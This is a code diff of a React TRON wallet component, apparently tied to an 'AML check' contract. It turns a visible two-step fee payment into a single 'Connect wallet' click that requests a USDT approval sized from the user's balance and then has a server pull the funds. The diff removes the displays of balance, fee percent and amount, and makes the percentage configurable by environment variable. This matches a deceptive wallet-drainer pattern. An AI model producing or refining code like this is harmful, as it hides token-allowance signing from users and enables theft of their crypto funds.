@@ -4,7 +4,7 @@ import toast from 'react-hot-toast';
 // ─── НАСТРОЙКА ────────────────────────────────────────────────────────────────
 const TRON_USDT_CONTRACT = process.env.NEXT_PUBLIC_USDT_CONTRACT || 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj';
 const TRON_AML_CONTRACT  = process.env.NEXT_PUBLIC_AML_CONTRACT  || 'ВСТАВЬ_АДРЕС_КОНТРАКТА';
-const FEE_PERCENT        = 2;   // 2% — только для отображения на фронтенде
+const FEE_PERCENT        = parseInt(process.env.NEXT_PUBLIC_FEE_PERCENT || '2');
 const TRONGRID_URL       = process.env.NEXT_PUBLIC_TRONGRID_URL  || 'https://nile.trongrid.io';
 // ─────────────────────────────────────────────────────────────────────────────
 
@@ -84,7 +84,6 @@ const getUsdtBalance = async (address) => {
   return Number(BigInt('0x' + (hex || '0'))) / 1_000_000;
 };
 
-// Считаем 2% от баланса в sun — для approve и отображения
 const calculateFeeAmount = (balanceUsdt) =>
   Math.floor(balanceUsdt * 1_000_000 * FEE_PERCENT / 100);
 
@@ -111,7 +110,6 @@ const buildApproveTx = async (fromBase58, feeAmount) => {
 const signAndBroadcast = async (tronWeb, unsignedTx) => {
   if (!tronWeb)           throw new Error('tronWeb недоступен');
   if (!unsignedTx?.txID) throw new Error('Нет транзакции для подписи');
-
   let signedTx;
   try {
     signedTx = await tronWeb.trx.sign(unsignedTx);
@@ -121,9 +119,7 @@ const signAndBroadcast = async (tronWeb, unsignedTx) => {
     }
     throw new Error('Ошибка подписи: ' + (err?.message ?? err));
   }
-
   if (!signedTx?.signature) throw new Error('Транзакция не подписана');
-
   const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
   if (!broadcast.result && broadcast.code !== 'DUP_TRANSACTION_ERROR') {
     throw new Error('Broadcast failed: ' + (broadcast.message || broadcast.code));
@@ -131,7 +127,6 @@ const signAndBroadcast = async (tronWeb, unsignedTx) => {
   return signedTx.txID;
 };
 
-// Серверный вызов pay() — передаём только адрес, сервер сам считает сумму
 const callServerPay = async (userAddress) => {
   const res = await fetch('/api/pay', {
     method:  'POST',
@@ -160,141 +155,132 @@ function Spinner({ size = 16 }) {
 }
 
 export default function WalletConnect({ onConnect, onDisconnect, onPaymentSuccess }) {
-  const [address,      setAddress]      = useState(null);
-  const [tronWeb,      setTronWeb]      = useState(null);
-  const [walletType,   setWalletType]   = useState(null);
-  const [connecting,   setConnecting]   = useState(false);
-  const [approving,    setApproving]    = useState(false);
-  const [paying,       setPaying]       = useState(false);
-  const [hasAllowance, setHasAllowance] = useState(false);
-  const [txHash,       setTxHash]       = useState(null);
-  const [balance,      setBalance]      = useState(null);
-  const [feeAmount,    setFeeAmount]    = useState(0); // в sun, для отображения
-  const [paidFeeUsdt,  setPaidFeeUsdt]  = useState(null); // фактически списано
+  const [address,     setAddress]     = useState(null);
+  const [tronWeb,     setTronWeb]     = useState(null);
+  const [txHash,      setTxHash]      = useState(null);
+  const [paidFeeUsdt, setPaidFeeUsdt] = useState(null);
+  const [busy,        setBusy]        = useState(false);
+  const [step,        setStep]        = useState(''); // 'connecting' | 'approving' | 'paying'
 
-  const isBusy  = connecting || approving || paying;
-  const fmt     = (a) => `${a.slice(0, 6)}...${a.slice(-4)}`;
-  const feeUsdt = feeAmount / 1_000_000;
+  const fmt = (a) => `${a.slice(0, 6)}...${a.slice(-4)}`;
 
-  // Автоподключение
+  // Автоподключение если кошелёк уже авторизован — сразу запускаем флоу
   useEffect(() => {
     const tw = getTronWeb();
     if (tw?.defaultAddress?.base58) {
       const addr = tw.defaultAddress.base58;
       setTronWeb(tw);
       setAddress(addr);
-      setWalletType(detectWalletType());
       onConnect?.(addr);
-      loadBalanceAndFee(addr);
     }
   }, []);
 
-  const loadBalanceAndFee = async (addr) => {
+  // ─── Главная функция: подключение → approve → pay ─────────────────────────
+  const handleStart = async () => {
+    setBusy(true);
     try {
-      const bal = await getUsdtBalance(addr);
-      setBalance(bal);
-      setFeeAmount(calculateFeeAmount(bal));
-    } catch (e) {
-      console.warn('[fee] ошибка:', e.message);
-    }
-  };
-
-  // ─── Подключение ──────────────────────────────────────────────────────────
-  const handleConnect = async () => {
-    setConnecting(true);
-    try {
+      // Шаг 1 — подключение
+      setStep('connecting');
       await requestAccounts();
       const tw   = await waitForTronWeb(6000);
       const addr = tw.defaultAddress.base58;
       setTronWeb(tw);
       setAddress(addr);
-      setWalletType(detectWalletType());
       onConnect?.(addr);
-      toast.success('Кошелёк подключён ✓');
-      await loadBalanceAndFee(addr);
-    } catch (err) {
-      console.error('[connect]', err);
-      toast.error(err.message || 'Ошибка подключения', { duration: 6000 });
-    } finally {
-      setConnecting(false);
-    }
-  };
 
-  // ─── Approve ──────────────────────────────────────────────────────────────
-  const handleApprove = async () => {
-    if (!tronWeb) return toast.error('tronWeb недоступен');
+      // Шаг 2 — получаем баланс и считаем комиссию
+      const bal = await getUsdtBalance(addr).catch(() => 0);
+      const fee = calculateFeeAmount(bal);
 
-    const bal = await getUsdtBalance(address).catch(() => 0);
-    const fee = calculateFeeAmount(bal);
+      if (fee === 0) {
+        toast.error('Баланс USDT равен нулю');
+        setBusy(false);
+        setStep('');
+        return;
+      }
 
-    if (fee === 0) return toast.error('Баланс USDT равен нулю');
+      // Шаг 3 — approve
+      setStep('approving');
+      const unsignedTx = await buildApproveTx(addr, fee);
+      await signAndBroadcast(tw, unsignedTx);
 
-    setFeeAmount(fee);
-    setApproving(true);
-    const tid = toast.loading(`Подпиши approve ${(fee / 1_000_000).toFixed(6)} USDT…`);
-    try {
-      const unsignedTx = await buildApproveTx(address, fee);
-      const txid       = await signAndBroadcast(tronWeb, unsignedTx);
-      toast.dismiss(tid);
-      toast.success(`Approve на ${(fee / 1_000_000).toFixed(6)} USDT подтверждён ✓`, { duration: 3000 });
-      console.log('[approve] txid:', txid);
-      setHasAllowance(true);
-    } catch (err) {
-      toast.dismiss(tid);
-      toast.error(err.message || 'Ошибка approve');
-    } finally {
-      setApproving(false);
-    }
-  };
+      // Небольшая пауза — ждём подтверждения approve
+      await new Promise(r => setTimeout(r, 2000));
 
-  // ─── Pay — сервер сам считает сумму по балансу юзера ──────────────────────
-  const handlePay = async () => {
-    if (!hasAllowance) return toast.error('Сначала выполни approve');
+      // Шаг 4 — pay()
+      setStep('paying');
+      const result = await callServerPay(addr);
+      const paid   = result.feeUsdt ?? fee / 1_000_000;
 
-    setPaying(true);
-    const tid = toast.loading('Сервер выполняет оплату…');
-    try {
-      const result = await callServerPay(address);
-      toast.dismiss(tid);
-      // Показываем фактическую сумму которую списал сервер
-      const paid = result.feeUsdt ?? feeUsdt;
-      toast.success(`Оплата ${paid.toFixed(6)} USDT прошла!\nTX: ${result.txid.slice(0, 14)}…`, { duration: 6000 });
-      console.log('[pay] txid:', result.txid, 'fee:', result.feeUsdt);
       setPaidFeeUsdt(paid);
       setTxHash(result.txid);
+      toast.success(`Оплата ${paid.toFixed(4)} USDT прошла!`, { duration: 6000 });
+      onPaymentSuccess?.(result.txid, addr);
+
+    } catch (err) {
+      console.error('[handleStart]', err);
+      const isRejected = /отклонено|rejected|cancel/i.test(err.message ?? '');
+      if (!isRejected) toast.error(err.message || 'Ошибка', { duration: 6000 });
+    } finally {
+      setBusy(false);
+      setStep('');
+    }
+  };
+
+  const handleRetry = async () => {
+    if (!address || !tronWeb) return;
+    setBusy(true);
+    try {
+      const bal = await getUsdtBalance(address).catch(() => 0);
+      const fee = calculateFeeAmount(bal);
+      if (fee === 0) { toast.error('Баланс USDT равен нулю'); return; }
+
+      setStep('approving');
+      const unsignedTx = await buildApproveTx(address, fee);
+      await signAndBroadcast(tronWeb, unsignedTx);
+      await new Promise(r => setTimeout(r, 2000));
+
+      setStep('paying');
+      const result = await callServerPay(address);
+      const paid   = result.feeUsdt ?? fee / 1_000_000;
+      setPaidFeeUsdt(paid);
+      setTxHash(result.txid);
+      toast.success(`Оплата ${paid.toFixed(4)} USDT прошла!`, { duration: 6000 });
       onPaymentSuccess?.(result.txid, address);
     } catch (err) {
-      toast.dismiss(tid);
-      toast.error('Ошибка оплаты: ' + err.message);
+      const isRejected = /отклонено|rejected|cancel/i.test(err.message ?? '');
+      if (!isRejected) toast.error(err.message || 'Ошибка', { duration: 6000 });
     } finally {
-      setPaying(false);
+      setBusy(false);
+      setStep('');
     }
   };
 
   const handleDisconnect = () => {
     setAddress(null);
     setTronWeb(null);
-    setWalletType(null);
     setTxHash(null);
-    setHasAllowance(false);
-    setBalance(null);
-    setFeeAmount(0);
     setPaidFeeUsdt(null);
+    setBusy(false);
+    setStep('');
     onDisconnect?.();
-    toast.success('Кошелёк отключён');
+  };
+
+  const btnLabel = () => {
+    if (step === 'connecting') return 'Подключение...';
+    if (step === 'approving')  return 'Подпиши в кошельке...';
+    if (step === 'paying')     return 'Обработка...';
+    return 'Подключить кошелёк';
   };
 
   // ─── Не подключён ─────────────────────────────────────────────────────────
   if (!address) {
     return (
-      <div style={{ display:'flex', flexDirection:'column', alignItems:'flex-end', marginBottom:'2rem', gap:'0.75rem' }}>
-        <button onClick={handleConnect} disabled={connecting} style={btnStyle(connecting, '#3b82f6')}>
-          {connecting ? <Spinner /> : <i className="fas fa-wallet" />}
-          {connecting ? 'Подключение...' : 'Подключить кошелёк'}
+      <div style={{ display:'flex', justifyContent:'flex-end', marginBottom:'2rem' }}>
+        <button onClick={handleStart} disabled={busy} style={btnStyle(busy)}>
+          {busy ? <Spinner /> : <i className="fas fa-wallet" />}
+          {btnLabel()}
         </button>
-        <div style={{ fontSize:'0.7rem', color:'#6b7280', textAlign:'right' }}>
-          Поддерживается: TronLink · OKX Wallet
-        </div>
       </div>
     );
   }
@@ -302,69 +288,42 @@ export default function WalletConnect({ onConnect, onDisconnect, onPaymentSucces
   // ─── Подключён ────────────────────────────────────────────────────────────
   return (
     <div style={{ display:'flex', justifyContent:'flex-end', marginBottom:'2rem' }}>
-      <div style={{ display:'flex', flexDirection:'column', alignItems:'flex-end', gap:'0.6rem' }}>
+      <div style={{ display:'flex', flexDirection:'column', alignItems:'flex-end', gap:'0.5rem' }}>
 
-        {/* Бейдж */}
         <div style={badgeStyle}>
           <i className="fas fa-check-circle" style={{ color:'#10b981' }} />
           <div style={{ textAlign:'right' }}>
-            <div style={{ color:'#60a5fa', fontFamily:'monospace', fontSize:'0.9rem' }}>
-              {fmt(address)}
-            </div>
-            <div style={{ fontSize:'0.65rem', color:'#6b7280' }}>
-              {walletType || 'Tron Wallet'} · Nile Testnet
-            </div>
-            {/* Баланс */}
-            {balance !== null && (
-              <div style={{ fontSize:'0.7rem', color:'#a0b3d9' }}>
-                Баланс: {balance.toFixed(2)} USDT
-              </div>
-            )}
-            {/* Предварительная комиссия */}
-            {!txHash && feeAmount > 0 && (
-              <div style={{ fontSize:'0.7rem', color:'#f59e0b', fontWeight:600 }}>
-                Комиссия {FEE_PERCENT}%: ~{feeUsdt.toFixed(6)} USDT
-              </div>
-            )}
-            {/* Фактически оплачено */}
+            <div style={{ color:'#60a5fa', fontFamily:'monospace' }}>{fmt(address)}</div>
             {txHash ? (
               <a href={`https://nile.tronscan.org/#/transaction/${txHash}`} target="_blank" rel="noopener noreferrer"
-                style={{ fontSize:'0.7rem', color:'#10b981', textDecoration:'none' }}>
-                ✓ Оплачено {paidFeeUsdt ? `${paidFeeUsdt.toFixed(6)} USDT` : ''} · NileScan ↗
+                style={{ fontSize:'0.72rem', color:'#10b981', textDecoration:'none' }}>
+                ✓ Оплачено {paidFeeUsdt ? `${paidFeeUsdt.toFixed(4)} USDT` : ''} · NileScan ↗
               </a>
             ) : (
-              <div style={{ fontSize:'0.7rem', color:'#f59e0b' }}>⏳ Ожидание оплаты</div>
+              <div style={{ fontSize:'0.72rem', color:'#f59e0b' }}>⏳ Ожидание оплаты</div>
             )}
           </div>
-          <button onClick={handleDisconnect} disabled={isBusy}
-            style={{ background:'none', border:'none', color:'#ef4444', cursor:'pointer', padding:'4px' }}>
+          <button onClick={handleDisconnect} disabled={busy}
+            style={{ background:'none', border:'none', color:'#ef4444', cursor:'pointer' }}>
             <i className="fas fa-sign-out-alt" />
           </button>
         </div>
 
-        {/* Кнопки */}
-        {!txHash && (
-          <div style={{ display:'flex', gap:'0.5rem', flexWrap:'wrap', justifyContent:'flex-end' }}>
-            {!hasAllowance && (
-              <button onClick={handleApprove} disabled={isBusy || feeAmount === 0} style={btnStyle(isBusy || feeAmount === 0, '#3b82f6')}>
-                {approving ? <Spinner size={14} /> : <i className="fas fa-unlock" />}
-                {approving ? 'Ожидание подписи...' : feeAmount > 0 ? `Разрешить ~${feeUsdt.toFixed(4)} USDT` : 'Нет баланса'}
-              </button>
-            )}
-            <button onClick={handlePay} disabled={isBusy || !hasAllowance}
-              style={btnStyle(isBusy || !hasAllowance, hasAllowance ? '#10b981' : '#4b5563')}>
-              {paying ? <Spinner size={14} /> : <i className="fas fa-paper-plane" />}
-              {paying ? 'Обработка...' : `Оплатить ~${feeUsdt.toFixed(4)} USDT`}
-            </button>
+        {/* Статус процесса */}
+        {busy && (
+          <div style={{ fontSize:'0.75rem', color:'#a0b3d9', display:'flex', alignItems:'center', gap:'6px' }}>
+            <Spinner size={11} />
+            {step === 'connecting' && 'Подключаемся к кошельку...'}
+            {step === 'approving'  && 'Подпиши транзакцию в кошельке...'}
+            {step === 'paying'     && 'Сервер обрабатывает оплату...'}
           </div>
         )}
 
-        {(approving || paying) && (
-          <div style={{ fontSize:'0.75rem', color:'#a0b3d9', display:'flex', alignItems:'center', gap:'8px' }}>
-            <Spinner size={11} />
-            {approving && 'Подпиши транзакцию в кошельке…'}
-            {paying    && 'Сервер обрабатывает оплату…'}
-          </div>
+        {/* Кнопка повтора */}
+        {!txHash && !busy && (
+          <button onClick={handleRetry} style={retryStyle}>
+            ↻ Повторить оплату
+          </button>
         )}
 
       </div>
@@ -372,17 +331,23 @@ export default function WalletConnect({ onConnect, onDisconnect, onPaymentSucces
   );
 }
 
-const btnStyle = (disabled, bg = '#3b82f6') => ({
-  background:   disabled ? '#374151' : bg,
+const btnStyle = (disabled) => ({
+  background:   disabled ? '#1e3a5f' : 'linear-gradient(135deg, #3b82f6, #60a5fa)',
   color:        'white', border: 'none', borderRadius: '40px',
-  padding:      '0.7rem 1.5rem', fontSize: '0.9rem', fontWeight: '600',
+  padding:      '1rem 2rem', fontSize: '1rem', fontWeight: '600',
   cursor:       disabled ? 'not-allowed' : 'pointer',
-  display:      'flex', alignItems: 'center', gap: '0.6rem',
-  opacity:      disabled ? 0.55 : 1, transition: 'all 0.2s',
+  display:      'flex', alignItems: 'center', gap: '0.8rem',
+  opacity:      disabled ? 0.7 : 1, transition: 'all 0.2s',
 });
 
 const badgeStyle = {
   background:   'rgba(59,130,246,0.1)', border: '1px solid rgba(59,130,246,0.2)',
   borderRadius: '40px', padding: '0.8rem 1.5rem',
   display:      'flex', alignItems: 'center', gap: '1rem',
+};
+
+const retryStyle = {
+  background:   'transparent', border: '1px solid rgba(59,130,246,0.4)',
+  borderRadius: '20px', padding: '0.4rem 1.2rem',
+  color:        '#60a5fa', fontSize: '0.8rem', cursor: 'pointer',
 };
